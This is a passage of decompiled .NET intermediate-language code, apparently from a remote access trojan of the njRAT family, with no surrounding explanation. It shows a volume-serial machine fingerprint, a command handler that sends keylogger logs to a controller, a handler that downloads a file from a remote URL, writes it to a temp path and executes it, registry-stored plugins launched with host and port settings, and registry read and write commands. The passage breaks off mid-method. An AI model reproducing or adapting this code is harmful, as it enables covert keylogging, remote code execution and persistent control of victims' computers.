      IL_0061:  leave.s    IL_0063

    }  // end handler
    IL_0063:  nop
    IL_0064:  ldloc.1
    IL_0065:  stloc.0
    IL_0066:  br.s       IL_0068

    IL_0068:  ldloc.0
    IL_0069:  ret
  } // end of method OK::GTV

  .method public static string  HWD() cil managed
  {
    // Code size       111 (0x6f)
    .maxstack  8
    .locals init ([0] string HWD,
             [1] string str,
             [2] int32 num,
             [3] string lpVolumeNameBuffer,
             [4] int32 lpMaximumComponentLength,
             [5] int32 lpFileSystemFlags,
             [6] string lpFileSystemNameBuffer,
             [7] string V_7,
             [8] class [mscorlib]System.Exception exception1,
             [9] class [mscorlib]System.Exception exception)
    IL_0000:  nop
    .try
    {
      IL_0001:  nop
      IL_0002:  ldnull
      IL_0003:  stloc.3
      IL_0004:  ldc.i4.0
      IL_0005:  stloc.s    lpMaximumComponentLength
      IL_0007:  ldc.i4.0
      IL_0008:  stloc.s    lpFileSystemFlags
      IL_000a:  ldnull
      IL_000b:  stloc.s    lpFileSystemNameBuffer
      IL_000d:  ldstr      "SystemDrive"
      IL_0012:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Environ(string)
      IL_0017:  ldstr      "\\"
      IL_001c:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_0021:  stloc.s    V_7
      IL_0023:  ldloca.s   V_7
      IL_0025:  ldloca.s   lpVolumeNameBuffer
      IL_0027:  ldc.i4.0
      IL_0028:  ldloca.s   num
      IL_002a:  ldloca.s   lpMaximumComponentLength
      IL_002c:  ldloca.s   lpFileSystemFlags
      IL_002e:  ldloca.s   lpFileSystemNameBuffer
      IL_0030:  ldc.i4.0
      IL_0031:  call       int32 j.OK::GetVolumeInformation(string&,
                                                            string&,
                                                            int32,
                                                            int32&,
                                                            int32&,
                                                            int32&,
                                                            string&,
                                                            int32)
      IL_0036:  pop
      IL_0037:  ldloc.2
      IL_0038:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Conversion::Hex(int32)
      IL_003d:  stloc.1
      IL_003e:  leave.s    IL_0068

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0040:  dup
      IL_0041:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0046:  stloc.s    exception1
      IL_0048:  nop
      IL_0049:  ldloc.s    exception1
      IL_004b:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0050:  nop
      IL_0051:  ldloc.s    exception1
      IL_0053:  stloc.s    exception
      IL_0055:  ldstr      "ERR"
      IL_005a:  stloc.1
      IL_005b:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0060:  nop
      IL_0061:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0066:  leave.s    IL_0068

    }  // end handler
    IL_0068:  nop
    IL_0069:  ldloc.1
    IL_006a:  stloc.0
    IL_006b:  br.s       IL_006d

    IL_006d:  ldloc.0
    IL_006e:  ret
  } // end of method OK::HWD

  .method public static void  Ind(uint8[] b) cil managed noinlining nooptimization
  {
    // Code size       3502 (0xdae)
    .maxstack  10
    .locals init ([0] string[] strArray,
             [1] uint8[] buffer,
             [2] string str4,
             [3] class [System]System.Net.WebClient client,
             [4] string path,
             [5] uint8[] bytes,
             [6] class [System]System.Net.WebClient client2,
             [7] string fileName,
             [8] string V_8,
             [9] bool V_9,
             [10] bool V_10,
             [11] class [mscorlib]System.IO.MemoryStream 'stream',
             [12] int32 length,
             [13] class [mscorlib]System.Exception exception1,
             [14] class [mscorlib]System.Exception exception,
             [15] class [mscorlib]System.Exception exception10,
             [16] class [mscorlib]System.Exception exception2,
             [17] class [mscorlib]System.Exception exception11,
             [18] class [mscorlib]System.Exception exception3,
             [19] uint8[] t,
             [20] bool V_20,
             [21] object objectValue,
             [22] bool V_22,
             [23] class [mscorlib]System.IO.MemoryStream stream2,
             [24] int32 offset,
             [25] bool V_25,
             [26] uint8[] buffer3,
             [27] bool V_27,
             [28] object 'instance',
             [29] bool V_29,
             [30] class [mscorlib]System.IO.MemoryStream stream3,
             [31] int32 num3,
             [32] string V_32,
             [33] valuetype [System.Drawing]System.Drawing.Rectangle bounds,
             [34] class [System.Drawing]System.Drawing.Bitmap image,
             [35] class [System.Drawing]System.Drawing.Graphics g,
             [36] valuetype [System.Drawing]System.Drawing.Size blockRegionSize,
             [37] class [System.Drawing]System.Drawing.Bitmap bitmap2,
             [38] class [mscorlib]System.IO.MemoryStream stream4,
             [39] class [mscorlib]System.IO.MemoryStream stream5,
             [40] string str2,
             [41] valuetype [System.Drawing]System.Drawing.Rectangle V_41,
             [42] class [mscorlib]System.Exception exception12,
             [43] class [mscorlib]System.Exception exception4,
             [44] bool V_44,
             [45] string V_45,
             [46] bool V_46,
             [47] bool V_47,
             [48] class [mscorlib]System.IO.MemoryStream stream6,
             [49] int32 num4,
             [50] class [mscorlib]System.Exception exception13,
             [51] class [mscorlib]System.Exception exception5,
             [52] class [mscorlib]System.Exception exception14,
             [53] class [mscorlib]System.Exception exception6,
             [54] class [mscorlib]System.Exception exception15,
             [55] class [mscorlib]System.Exception exception7,
             [56] bool V_56,
             [57] object[] arguments,
             [58] bool[] copyBack,
             [59] bool V_59,
             [60] int32 num5,
             [61] bool V_61,
             [62] bool V_62,
             [63] bool V_63,
             [64] bool V_64,
             [65] class [mscorlib]System.IO.MemoryStream stream7,
             [66] int32 num6,
             [67] class [mscorlib]System.Exception exception16,
             [68] class [mscorlib]System.Exception exception8,
             [69] bool V_69,
             [70] class [mscorlib]System.Exception exception17,
             [71] class [mscorlib]System.Exception exception9)
    IL_0000:  nop
    IL_0001:  ldarga.s   b
    IL_0003:  call       string j.OK::BS(uint8[]&)
    IL_0008:  ldsfld     string j.OK::Y
    IL_000d:  ldc.i4.m1
    IL_000e:  ldc.i4.0
    IL_000f:  call       string[] [Microsoft.VisualBasic]Microsoft.VisualBasic.Strings::Split(string,
                                                                                              string,
                                                                                              int32,
                                                                                              valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.CompareMethod)
    IL_0014:  stloc.0
    .try
    {
      IL_0015:  nop
      IL_0016:  ldloc.0
      IL_0017:  ldc.i4.0
      IL_0018:  ldelem.ref
      IL_0019:  stloc.2
      IL_001a:  nop
      IL_001b:  ldloc.2
      IL_001c:  ldstr      "ll"
      IL_0021:  ldc.i4.0
      IL_0022:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0027:  brfalse.s  IL_004a

      IL_0029:  ldloc.2
      IL_002a:  ldstr      "kl"
      IL_002f:  ldc.i4.0
      IL_0030:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0035:  brfalse.s  IL_0056

      IL_0037:  ldloc.2
      IL_0038:  ldstr      "prof"
      IL_003d:  ldc.i4.0
      IL_003e:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0043:  brfalse.s  IL_0080

      IL_0045:  br         IL_0126

      IL_004a:  nop
      IL_004b:  ldc.i4.0
      IL_004c:  stsfld     bool j.OK::Cn
      IL_0051:  leave      IL_0dad

      IL_0056:  nop
      IL_0057:  ldstr      "kl"
      IL_005c:  ldsfld     string j.OK::Y
      IL_0061:  ldsfld     class j.kl j.OK::kq
      IL_0066:  ldflda     string j.kl::Logs
      IL_006b:  call       string j.OK::ENB(string&)
      IL_0070:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_0075:  call       bool j.OK::Send(string)
      IL_007a:  pop
      IL_007b:  leave      IL_0dad

      IL_0080:  nop
      IL_0081:  nop
      IL_0082:  ldloc.0
      IL_0083:  ldc.i4.1
      IL_0084:  ldelem.ref
      IL_0085:  stloc.s    V_8
      IL_0087:  ldloc.s    V_8
      IL_0089:  ldstr      "~"
      IL_008e:  ldc.i4.0
      IL_008f:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0094:  brfalse.s  IL_00b6

      IL_0096:  ldloc.s    V_8
      IL_0098:  ldstr      "!"
      IL_009d:  ldc.i4.0
      IL_009e:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_00a3:  brfalse.s  IL_00c6

      IL_00a5:  ldloc.s    V_8
      IL_00a7:  ldstr      "@"
      IL_00ac:  ldc.i4.0
      IL_00ad:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_00b2:  brfalse.s  IL_0114

      IL_00b4:  br.s       IL_0120

      IL_00b6:  nop
      IL_00b7:  ldloc.0
      IL_00b8:  ldc.i4.2
      IL_00b9:  ldelem.ref
      IL_00ba:  ldloc.0
      IL_00bb:  ldc.i4.3
      IL_00bc:  ldelem.ref
      IL_00bd:  ldc.i4.1
      IL_00be:  call       bool j.OK::STV(string,
                                          object,
                                          valuetype [mscorlib]Microsoft.Win32.RegistryValueKind)
      IL_00c3:  pop
      IL_00c4:  br.s       IL_0120

      IL_00c6:  nop
      IL_00c7:  ldloc.0
      IL_00c8:  ldc.i4.2
      IL_00c9:  ldelem.ref
      IL_00ca:  ldloc.0
      IL_00cb:  ldc.i4.3
      IL_00cc:  ldelem.ref
      IL_00cd:  ldc.i4.1
      IL_00ce:  call       bool j.OK::STV(string,
                                          object,
                                          valuetype [mscorlib]Microsoft.Win32.RegistryValueKind)
      IL_00d3:  pop
      IL_00d4:  ldstr      "getvalue"
      IL_00d9:  ldsfld     string j.OK::Y
      IL_00de:  ldloc.0
      IL_00df:  ldc.i4.1
      IL_00e0:  ldelem.ref
      IL_00e1:  ldsfld     string j.OK::Y
      IL_00e6:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string,
                                                                  string)
      IL_00eb:  ldloc.0
      IL_00ec:  ldc.i4.1
      IL_00ed:  ldelem.ref
      IL_00ee:  ldstr      ""
      IL_00f3:  call       object j.OK::GTV(string,
                                            object)
      IL_00f8:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_00fd:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConcatenateObject(object,
                                                                                                                             object)
      IL_0102:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0107:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(object)
      IL_010c:  call       bool j.OK::Send(string)
      IL_0111:  pop
      IL_0112:  br.s       IL_0120

      IL_0114:  nop
      IL_0115:  ldloc.0
      IL_0116:  ldc.i4.2
      IL_0117:  ldelem.ref
      IL_0118:  call       void j.OK::DLV(string)
      IL_011d:  nop
      IL_011e:  br.s       IL_0120

      IL_0120:  nop
      IL_0121:  leave      IL_0dad

      IL_0126:  nop
      IL_0127:  ldloc.2
      IL_0128:  ldstr      "rn"
      IL_012d:  ldc.i4.0
      IL_012e:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0133:  ldc.i4.0
      IL_0134:  cgt.un
      IL_0136:  stloc.s    V_9
      IL_0138:  ldloc.s    V_9
      IL_013a:  brfalse.s  IL_0141

      IL_013c:  br         IL_02eb

      IL_0141:  nop
      IL_0142:  ldloc.0
      IL_0143:  ldc.i4.2
      IL_0144:  ldelem.ref
      IL_0145:  ldc.i4.0
      IL_0146:  callvirt   instance char [mscorlib]System.String::get_Chars(int32)
      IL_014b:  ldc.i4.s   31
      IL_014d:  ceq
      IL_014f:  stloc.s    V_10
      IL_0151:  ldloc.s    V_10
      IL_0153:  brfalse    IL_01e9

      .try
      {
        IL_0158:  nop
        IL_0159:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
        IL_015e:  stloc.s    'stream'
        IL_0160:  ldloc.0
        IL_0161:  ldc.i4.0
        IL_0162:  ldelem.ref
        IL_0163:  ldsfld     string j.OK::Y
        IL_0168:  ldloc.0
        IL_0169:  ldc.i4.1
        IL_016a:  ldelem.ref
        IL_016b:  ldsfld     string j.OK::Y
        IL_0170:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string,
                                                                    string)
        IL_0175:  callvirt   instance int32 [mscorlib]System.String::get_Length()
        IL_017a:  stloc.s    length
        IL_017c:  ldloc.s    'stream'
        IL_017e:  ldarg.0
        IL_017f:  ldloc.s    length
        IL_0181:  ldarg.0
        IL_0182:  ldlen
        IL_0183:  conv.i4
        IL_0184:  ldloc.s    length
        IL_0186:  sub.ovf
        IL_0187:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                                   int32,
                                                                                   int32)
        IL_018c:  nop
        IL_018d:  ldloc.s    'stream'
        IL_018f:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
        IL_0194:  call       uint8[] j.OK::ZIP(uint8[])
        IL_0199:  stloc.1
        IL_019a:  leave      IL_0248

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_019f:  dup
        IL_01a0:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_01a5:  stloc.s    exception1
        IL_01a7:  nop
        IL_01a8:  ldloc.s    exception1
        IL_01aa:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_01af:  nop
        IL_01b0:  ldloc.s    exception1
        IL_01b2:  stloc.s    exception
        IL_01b4:  ldstr      "MSG"
        IL_01b9:  ldsfld     string j.OK::Y
        IL_01be:  ldstr      "Execute ERROR"
        IL_01c3:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_01c8:  call       bool j.OK::Send(string)
        IL_01cd:  pop
        IL_01ce:  ldstr      "bla"
        IL_01d3:  call       bool j.OK::Send(string)
        IL_01d8:  pop
        IL_01d9:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_01de:  nop
        IL_01df:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_01e4:  leave      IL_0dad

      }  // end handler
      IL_01e9:  nop
      IL_01ea:  newobj     instance void [System]System.Net.WebClient::.ctor()
      IL_01ef:  stloc.3
      .try
      {
        IL_01f0:  nop
        IL_01f1:  ldloc.3
        IL_01f2:  ldloc.0
        IL_01f3:  ldc.i4.2
        IL_01f4:  ldelem.ref
        IL_01f5:  callvirt   instance uint8[] [System]System.Net.WebClient::DownloadData(string)
        IL_01fa:  stloc.1
        IL_01fb:  leave.s    IL_0247

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_01fd:  dup
        IL_01fe:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_0203:  stloc.s    exception10
        IL_0205:  nop
        IL_0206:  ldloc.s    exception10
        IL_0208:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_020d:  nop
        IL_020e:  ldloc.s    exception10
        IL_0210:  stloc.s    exception2
        IL_0212:  ldstr      "MSG"
        IL_0217:  ldsfld     string j.OK::Y
        IL_021c:  ldstr      "Download ERROR"
        IL_0221:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_0226:  call       bool j.OK::Send(string)
        IL_022b:  pop
        IL_022c:  ldstr      "bla"
        IL_0231:  call       bool j.OK::Send(string)
        IL_0236:  pop
        IL_0237:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_023c:  nop
        IL_023d:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0242:  leave      IL_0dad

      }  // end handler
      IL_0247:  nop
      IL_0248:  nop
      IL_0249:  ldstr      "bla"
      IL_024e:  call       bool j.OK::Send(string)
      IL_0253:  pop
      IL_0254:  call       string [mscorlib]System.IO.Path::GetTempFileName()
      IL_0259:  ldstr      "."
      IL_025e:  ldloc.0
      IL_025f:  ldc.i4.1
      IL_0260:  ldelem.ref
      IL_0261:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_0266:  stloc.s    path
      .try
      {
        IL_0268:  nop
        IL_0269:  ldloc.s    path
        IL_026b:  ldloc.1
        IL_026c:  call       void [mscorlib]System.IO.File::WriteAllBytes(string,
                                                                          uint8[])
        IL_0271:  nop
        IL_0272:  ldloc.s    path
        IL_0274:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::Start(string)
        IL_0279:  pop
        IL_027a:  ldstr      "MSG"
        IL_027f:  ldsfld     string j.OK::Y
        IL_0284:  ldstr      "Executed As "
        IL_0289:  ldloc.s    path
        IL_028b:  newobj     instance void [mscorlib]System.IO.FileInfo::.ctor(string)
        IL_0290:  callvirt   instance string [mscorlib]System.IO.FileInfo::get_Name()
        IL_0295:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string,
                                                                    string)
        IL_029a:  call       bool j.OK::Send(string)
        IL_029f:  pop
        IL_02a0:  leave      IL_0dad

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_02a5:  dup
        IL_02a6:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_02ab:  stloc.s    exception11
        IL_02ad:  nop
        IL_02ae:  ldloc.s    exception11
        IL_02b0:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_02b5:  nop
        IL_02b6:  ldloc.s    exception11
        IL_02b8:  stloc.s    exception3
        IL_02ba:  ldstr      "MSG"
        IL_02bf:  ldsfld     string j.OK::Y
        IL_02c4:  ldstr      "Execute ERROR "
        IL_02c9:  ldloc.s    exception3
        IL_02cb:  callvirt   instance string [mscorlib]System.Exception::get_Message()
        IL_02d0:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string,
                                                                    string)
        IL_02d5:  call       bool j.OK::Send(string)
        IL_02da:  pop
        IL_02db:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_02e0:  nop
        IL_02e1:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_02e6:  leave      IL_0dad

      }  // end handler
      IL_02eb:  nop
      IL_02ec:  nop
      IL_02ed:  ldloc.2
      IL_02ee:  ldstr      "inv"
      IL_02f3:  ldc.i4.0
      IL_02f4:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_02f9:  brfalse.s  IL_0333

      IL_02fb:  ldloc.2
      IL_02fc:  ldstr      "ret"
      IL_0301:  ldc.i4.0
      IL_0302:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0307:  brfalse    IL_0582

      IL_030c:  ldloc.2
      IL_030d:  ldstr      "CAP"
      IL_0312:  ldc.i4.0
      IL_0313:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0318:  brfalse    IL_0709

      IL_031d:  ldloc.2
      IL_031e:  ldstr      "un"
      IL_0323:  ldc.i4.0
      IL_0324:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0329:  brfalse    IL_08cc

      IL_032e:  br         IL_0941

      IL_0333:  nop
      IL_0334:  ldloc.0
      IL_0335:  ldc.i4.1
      IL_0336:  ldelem.ref
      IL_0337:  ldc.i4.0
      IL_0338:  newarr     [mscorlib]System.Byte
      IL_033d:  call       object j.OK::GTV(string,
                                            object)
      IL_0342:  castclass  uint8[]
      IL_0347:  stloc.s    t
      IL_0349:  ldloc.0
      IL_034a:  ldc.i4.3
      IL_034b:  ldelem.ref
      IL_034c:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_0351:  ldc.i4.s   10
      IL_0353:  clt
      IL_0355:  ldloc.s    t
      IL_0357:  ldlen
      IL_0358:  conv.i4
      IL_0359:  ldc.i4.0
      IL_035a:  ceq
      IL_035c:  and
      IL_035d:  stloc.s    V_20
      IL_035f:  ldloc.s    V_20
      IL_0361:  brfalse.s  IL_03a1

      IL_0363:  ldc.i4.5
      IL_0364:  newarr     [mscorlib]System.String
      IL_0369:  dup
      IL_036a:  ldc.i4.0
      IL_036b:  ldstr      "pl"
      IL_0370:  stelem.ref
      IL_0371:  dup
      IL_0372:  ldc.i4.1
      IL_0373:  ldsfld     string j.OK::Y
      IL_0378:  stelem.ref
      IL_0379:  dup
      IL_037a:  ldc.i4.2
      IL_037b:  ldloc.0
      IL_037c:  ldc.i4.1
      IL_037d:  ldelem.ref
      IL_037e:  stelem.ref
      IL_037f:  dup
      IL_0380:  ldc.i4.3
      IL_0381:  ldsfld     string j.OK::Y
      IL_0386:  stelem.ref
      IL_0387:  dup
      IL_0388:  ldc.i4.4
      IL_0389:  ldc.i4.1
      IL_038a:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(int32)
      IL_038f:  stelem.ref
      IL_0390:  call       string [mscorlib]System.String::Concat(string[])
      IL_0395:  call       bool j.OK::Send(string)
      IL_039a:  pop
      IL_039b:  nop
      IL_039c:  br         IL_057d

      IL_03a1:  nop
      IL_03a2:  ldloc.0
      IL_03a3:  ldc.i4.3
      IL_03a4:  ldelem.ref
      IL_03a5:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_03aa:  ldc.i4.s   10
      IL_03ac:  cgt
      IL_03ae:  stloc.s    V_22
      IL_03b0:  ldloc.s    V_22
      IL_03b2:  brfalse.s  IL_0423

      IL_03b4:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
      IL_03b9:  stloc.s    stream2
      IL_03bb:  ldc.i4.6
      IL_03bc:  newarr     [mscorlib]System.String
      IL_03c1:  dup
      IL_03c2:  ldc.i4.0
      IL_03c3:  ldloc.0
      IL_03c4:  ldc.i4.0
      IL_03c5:  ldelem.ref
      IL_03c6:  stelem.ref
      IL_03c7:  dup
      IL_03c8:  ldc.i4.1
      IL_03c9:  ldsfld     string j.OK::Y
      IL_03ce:  stelem.ref
      IL_03cf:  dup
      IL_03d0:  ldc.i4.2
      IL_03d1:  ldloc.0
      IL_03d2:  ldc.i4.1
      IL_03d3:  ldelem.ref
      IL_03d4:  stelem.ref
      IL_03d5:  dup
      IL_03d6:  ldc.i4.3
      IL_03d7:  ldsfld     string j.OK::Y
      IL_03dc:  stelem.ref
      IL_03dd:  dup
      IL_03de:  ldc.i4.4
      IL_03df:  ldloc.0
      IL_03e0:  ldc.i4.2
      IL_03e1:  ldelem.ref
      IL_03e2:  stelem.ref
      IL_03e3:  dup
      IL_03e4:  ldc.i4.5
      IL_03e5:  ldsfld     string j.OK::Y
      IL_03ea:  stelem.ref
      IL_03eb:  call       string [mscorlib]System.String::Concat(string[])
      IL_03f0:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_03f5:  stloc.s    offset
      IL_03f7:  ldloc.s    stream2
      IL_03f9:  ldarg.0
      IL_03fa:  ldloc.s    offset
      IL_03fc:  ldarg.0
      IL_03fd:  ldlen
      IL_03fe:  conv.i4
      IL_03ff:  ldloc.s    offset
      IL_0401:  sub.ovf
      IL_0402:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                                 int32,
                                                                                 int32)
      IL_0407:  nop
      IL_0408:  ldloc.s    stream2
      IL_040a:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
      IL_040f:  call       uint8[] j.OK::ZIP(uint8[])
      IL_0414:  stloc.s    t
      IL_0416:  ldloc.0
      IL_0417:  ldc.i4.1
      IL_0418:  ldelem.ref
      IL_0419:  ldloc.s    t
      IL_041b:  ldc.i4.3
      IL_041c:  call       bool j.OK::STV(string,
                                          object,
                                          valuetype [mscorlib]Microsoft.Win32.RegistryValueKind)
      IL_0421:  pop
      IL_0422:  nop
      IL_0423:  nop
      IL_0424:  ldc.i4.5
      IL_0425:  newarr     [mscorlib]System.String
      IL_042a:  dup
      IL_042b:  ldc.i4.0
      IL_042c:  ldstr      "pl"
      IL_0431:  stelem.ref
      IL_0432:  dup
      IL_0433:  ldc.i4.1
      IL_0434:  ldsfld     string j.OK::Y
      IL_0439:  stelem.ref
      IL_043a:  dup
      IL_043b:  ldc.i4.2
      IL_043c:  ldloc.0
      IL_043d:  ldc.i4.1
      IL_043e:  ldelem.ref
      IL_043f:  stelem.ref
      IL_0440:  dup
      IL_0441:  ldc.i4.3
      IL_0442:  ldsfld     string j.OK::Y
      IL_0447:  stelem.ref
      IL_0448:  dup
      IL_0449:  ldc.i4.4
      IL_044a:  ldc.i4.0
      IL_044b:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(int32)
      IL_0450:  stelem.ref
      IL_0451:  call       string [mscorlib]System.String::Concat(string[])
      IL_0456:  call       bool j.OK::Send(string)
      IL_045b:  pop
      IL_045c:  ldloc.s    t
      IL_045e:  ldstr      "A"
      IL_0463:  call       object j.OK::Plugin(uint8[],
                                               string)
      IL_0468:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_046d:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0472:  stloc.s    objectValue
      IL_0474:  ldloc.s    objectValue
      IL_0476:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_047b:  ldnull
      IL_047c:  ldstr      "h"
      IL_0481:  ldc.i4.1
      IL_0482:  newarr     [mscorlib]System.Object
      IL_0487:  dup
      IL_0488:  ldc.i4.0
      IL_0489:  ldsfld     string j.OK::H
      IL_048e:  stelem.ref
      IL_048f:  ldnull
      IL_0490:  ldnull
      IL_0491:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateSet(object,
                                                                                                                      class [mscorlib]System.Type,
                                                                                                                      string,
                                                                                                                      object[],
                                                                                                                      string[],
                                                                                                                      class [mscorlib]System.Type[])
      IL_0496:  nop
      IL_0497:  ldloc.s    objectValue
      IL_0499:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_049e:  ldnull
      IL_049f:  ldstr      "p"
      IL_04a4:  ldc.i4.1
      IL_04a5:  newarr     [mscorlib]System.Object
      IL_04aa:  dup
      IL_04ab:  ldc.i4.0
      IL_04ac:  ldsfld     string j.OK::P
      IL_04b1:  stelem.ref
      IL_04b2:  ldnull
      IL_04b3:  ldnull
      IL_04b4:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateSet(object,
                                                                                                                      class [mscorlib]System.Type,
                                                                                                                      string,
                                                                                                                      object[],
                                                                                                                      string[],
                                                                                                                      class [mscorlib]System.Type[])
      IL_04b9:  nop
      IL_04ba:  ldloc.s    objectValue
      IL_04bc:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_04c1:  ldnull
      IL_04c2:  ldstr      "osk"
      IL_04c7:  ldc.i4.1
      IL_04c8:  newarr     [mscorlib]System.Object
      IL_04cd:  dup
      IL_04ce:  ldc.i4.0
      IL_04cf:  ldloc.0
      IL_04d0:  ldc.i4.2
      IL_04d1:  ldelem.ref
      IL_04d2:  stelem.ref
      IL_04d3:  ldnull
      IL_04d4:  ldnull
      IL_04d5:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateSet(object,
                                                                                                                      class [mscorlib]System.Type,
                                                                                                                      string,
                                                                                                                      object[],
                                                                                                                      string[],
                                                                                                                      class [mscorlib]System.Type[])
      IL_04da:  nop
      IL_04db:  ldloc.s    objectValue
      IL_04dd:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_04e2:  ldnull
      IL_04e3:  ldstr      "start"
      IL_04e8:  ldc.i4.0
      IL_04e9:  newarr     [mscorlib]System.Object
      IL_04ee:  ldnull
      IL_04ef:  ldnull
      IL_04f0:  ldnull
      IL_04f1:  ldc.i4.1
      IL_04f2:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateCall(object,
                                                                                                                         class [mscorlib]System.Type,
                                                                                                                         string,
                                                                                                                         object[],
                                                                                                                         string[],
                                                                                                                         class [mscorlib]System.Type[],
                                                                                                                         bool[],
                                                                                                                         bool)
      IL_04f7:  pop
      IL_04f8:  br.s       IL_0502
